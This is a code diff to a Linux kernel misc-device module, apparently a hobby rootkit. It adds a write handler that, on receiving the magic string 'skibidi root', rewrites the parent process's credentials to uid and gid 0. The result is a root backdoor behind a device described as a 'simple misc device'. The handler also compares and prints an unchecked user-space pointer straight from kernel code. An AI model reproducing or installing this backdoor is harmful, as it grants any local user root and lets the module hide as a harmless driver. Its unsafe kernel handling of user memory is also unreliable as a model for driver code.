@@ -4,43 +4,41 @@
 #include <linux/miscdevice.h>
 #include <linux/module.h>
 #include <linux/fs.h>
-#include <linux/cdev.h>
+#include <linux/cred.h>
+#include <linux/sched.h>
 
-// int misc_register(struct miscdevice *misc)
+#include "include/core.h"
+#include "include/debug.h"
 
-/*
-struct miscdevice mymisc;
-mymisc->name = "test misc device";
-mymisc->minor = MISC_DYNAMIC_MINOR; // defined in miscdevice.h
-*/
 
 static int      __init mymisc_init(void);
 static void     __exit mymisc_exit(void);
-static int 		mymisc_open(struct inode *i, struct file *f);
-static int 		mymisc_release(struct inode *i, struct file *f);
+static int 	    mymisc_open(struct inode *i, struct file *f);
+static int 	    mymisc_release(struct inode *i, struct file *f);
 static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off);
-//static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t count, loff_t *off);
+static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off);
 static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg);
 
+int set_root(void);
 
 static struct file_operations fops =
 {
-    .owner      	= THIS_MODULE,
-    .read       	= mymisc_read,
-//	.write			= mymisc_write,
-    .open       	= mymisc_open,
-    .release    	= mymisc_release,
-	.unlocked_ioctl = mymisc_ioctl
+    .owner      	    = THIS_MODULE,
+    .read       	    = mymisc_read,
+    .write		        = mymisc_write,
+    .open       	    = mymisc_open,
+    .release    	    = mymisc_release,
+    .unlocked_ioctl     = mymisc_ioctl
 };
 
-///*
+
+//https://github.com/torvalds/linux/blob/master/include/linux/miscdevice.h#L79
 struct miscdevice mymisc = {
     .name = "bissap",
     .minor = MISC_DYNAMIC_MINOR,
-	.fops = &fops 
+    .fops = &fops 
 };
-//*/
-//https://github.com/torvalds/linux/blob/master/include/linux/miscdevice.h#L79
+
 
 static int mymisc_open(struct inode *i, struct file *f)
 {
@@ -55,25 +53,38 @@ static int mymisc_open(struct inode *i, struct file *f)
 //release
 static int mymisc_release(struct inode *i, struct file *f)
 {
-        pr_info("Device File Closed...!!!\n");
+        //pr_info("Device File Closed...!!!\n");
         return 0;
 }
 
 //read
 static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
 {
-        pr_info("Device have been read...!!!\n");
+        //pr_info("Device have been read...!!!\n");
         return 0;
 }
 
-/*
+
 //write
-static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t count, loff_t *off)
+static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 {
-        pr_info("Device have been written...!!!\n");
-        return 0;
+        pr_info("Got : %s", buf);
+        
+        if (strcmp(buf, "skibidi root") == 0)
+        {
+                pr_info("Blud wanted to get root\n");
+                int ret;
+
+                ret = set_root();
+                if (ret < 0) {
+                pr_err("set_root failed with error: %d\n", ret);
+                } else {
+                pr_info("Should have got root\n");
+    }
+        }
+        return len;
 }
-*/
+
 
 //ioctl
 static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg)
@@ -103,6 +114,38 @@ static void __exit mymisc_exit(void)
     pr_info("misc_register exit done !!!\n");
 }
 
+int set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return -1;
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    //commit_creds(root);
+
+
+    struct task_struct *parent;
+    parent = current->real_parent; //https://github.com/torvalds/linux/blob/bf9aa14fc523d2763fc9a10672a709224e8fcaf4/include/linux/sched.h#L1028   
+    // Commit the new credentials to the parent process
+    if (parent) {
+        task_lock(parent); // Lock to modify safely
+        parent->real_cred = root;
+        parent->cred = root;
+        task_unlock(parent); // Unlock after modification
+        printk(KERN_INFO "rootkit: Parent process privileges escalated successfully.\n"); 
+    } else {
+        printk(KERN_ALERT "rootkit: Parent task not found.\n");
+        return 1;
+    }
+    return 0;
+}    
+
 module_init(mymisc_init)
 module_exit(mymisc_exit)
 
@@ -110,3 +153,4 @@ MODULE_LICENSE("MIT");
 MODULE_AUTHOR("jsp frr j'essaye de rootkiter");
 MODULE_DESCRIPTION("simple misc device");
 MODULE_VERSION("");
+
